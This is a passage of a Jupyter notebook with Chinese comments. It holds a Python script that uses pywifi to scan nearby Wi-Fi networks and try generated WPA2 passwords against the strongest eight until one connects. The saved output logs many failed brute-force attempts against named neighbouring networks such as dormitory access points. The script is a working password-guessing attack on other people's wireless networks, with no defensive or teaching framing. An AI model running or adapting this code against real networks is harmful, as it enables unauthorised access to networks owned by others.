     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:52:40,864 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 118 Fail Current WifiName: whhh Current Password: JBo643795\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:52:45,883 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 118 Fail Current WifiName: Ruoshui317 Current Password: JBo643795\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:52:51,439 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 118 Fail Current WifiName: 311 Current Password: JBo643795\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:52:57,022 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 118 Fail Current WifiName: 321sushe Current Password: JBo643795\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:53:02,601 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 118 Fail Current WifiName: 313 Current Password: JBo643795\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:53:08,174 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 120 Fail Current WifiName: BP2197 Current Password: EIi937995\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:53:13,750 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 120 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: EIi937995\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:53:19,324 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 120 Fail Current WifiName: whhh Current Password: EIi937995\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:53:24,341 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 120 Fail Current WifiName: Ruoshui317 Current Password: EIi937995\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:53:29,911 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 120 Fail Current WifiName: 311 Current Password: EIi937995\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:53:35,479 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 120 Fail Current WifiName: 321sushe Current Password: EIi937995\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:53:41,046 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 120 Fail Current WifiName: 313 Current Password: EIi937995\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:53:46,612 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 121 Fail Current WifiName: BP2197 Current Password: 67566679nk\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:53:52,185 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 121 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 67566679nk\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:53:57,765 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 121 Fail Current WifiName: whhh Current Password: 67566679nk\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:54:02,786 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 121 Fail Current WifiName: Ruoshui317 Current Password: 67566679nk\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:54:08,356 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 121 Fail Current WifiName: 311 Current Password: 67566679nk\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:54:13,932 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 121 Fail Current WifiName: 321sushe Current Password: 67566679nk\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:54:19,504 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 121 Fail Current WifiName: 313 Current Password: 67566679nk\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:54:25,077 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 122 Fail Current WifiName: BP2197 Current Password: bh2235924\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:54:30,653 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 122 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: bh2235924\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:54:36,221 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 122 Fail Current WifiName: whhh Current Password: bh2235924\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:54:41,237 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 122 Fail Current WifiName: Ruoshui317 Current Password: bh2235924\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:54:46,809 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 122 Fail Current WifiName: 311 Current Password: bh2235924\n"
     ]
    }
   ],
   "source": [
    "import pywifi\n",
    "from pywifi import const #引用一些定义\n",
    "import time\n",
    "namelist = []\n",
    "ssidlist = []\n",
    "result = [] #存放查询到的WIFI,密码\n",
    "wificount=8 #查询附近信号最强的5个WIFI，最多5个\n",
    "def getwifi():\n",
    "  wifi=pywifi.PyWiFi()#抓取网卡接口\n",
    "  ifaces=wifi.interfaces()[0]#获取网卡\n",
    "  ifaces.scan()\n",
    "  time.sleep(8) \n",
    "  bessis = ifaces.scan_results()\n",
    "  list = []  \n",
    "  for data in bessis:\n",
    "    if(data.ssid not in namelist): #去掉重复的WIFI名称\n",
    "      namelist.append(data.ssid)\n",
    "      list.append((data.ssid, data.signal))  \n",
    "  sorted(list, key=lambda st: st[1], reverse=True)\n",
    "  time.sleep(1)\n",
    "  n=0\n",
    "  if len(list) is not 0:\n",
    "    for item in list:\n",
    "      if(item[0] not in ssidlist):\n",
    "        n=n+1\n",
    "        if n<=wificount:\n",
    "          ssidlist.append(item[0])\n",
    "  print(ssidlist)\n",
    "def testwifi(ssidname,password):\n",
    "  wifi=pywifi.PyWiFi()#抓取网卡接口\n",
    "  ifaces=wifi.interfaces()[0]#获取网卡\n",
    "  ifaces.disconnect()#断开无限网卡连接\n",
    "  profile=pywifi.Profile()#创建wifi连接文件\n",
    "  profile.ssid=ssidname#定义wifissid\n",
    "  profile.auth=const.AUTH_ALG_OPEN#网卡的开放\n",
    "  profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法\n",
    "  profile.cipher=const.CIPHER_TYPE_CCMP##加密单元\n",
    "  profile.key=password #wifi密码\n",
    "  ifaces.remove_all_network_profiles()#删除其他所有配置文件\n",
    "  tmp_profile=ifaces.add_network_profile(profile)#加载配置文件\n",
    "  ifaces.connect(tmp_profile)#连接wifi\n",
    "  time.sleep(5)#5秒内能否连接上\n",
    "  if ifaces.status()==const.IFACE_CONNECTED:   \n",
    "    return True   \n",
    "  else:\n",
    "    #print(\"[-]WiFi connection failure!\")\n",
    "    return False\n",
    "  #ifaces.disconnect()#断开连接\n",
    "  #time.sleep(1)\n",
    "  return True\n",
    "\n",
    "def main():\n",
    "    getwifi() \n",
    "    find_pwd = False\n",
    "#     ssidlist = ['Oun'] #如果知道WIFI直接写就行了。\n",
    "    ssidlist.remove('BP2380') \n",
    "    num = 0 # 测试的次数\n",
    "    while True:\n",
    "        num += 1\n",
    "#         if(len(ssidlist) is 0):\n",
    "#             break\n",
    "        if(find_pwd):\n",
    "            break\n",
    "        try: \n",
    "            password = creat_pwd(num)  \n",
    "            if not password:\n",
    "                continue\n",
    "                \n",
    "#             for item in result: #把已经找到密码的WIFI从查询中删除。\n",
    "#                 ssidlist.remove(item[0])\n",
    "   \n",
    "            for ssidname in ssidlist:\n",
    "                if(testwifi(ssidname,password)==True):\n",
    "                    print('num=',num,'Succ','Current WifiName:',ssidname,'Current Password:',password)\n",
    "                    find_pwd = True\n",
    "                else:\n",
    "                    print('num=',num,'Fail','Current WifiName:',ssidname,'Current Password:',password)\n",
    "        except:\n",
    "            continue\n",
    "\n",
    "\n",
    "if __name__ == '__main__':\n",
    "  main()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.2"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": false,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": false
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
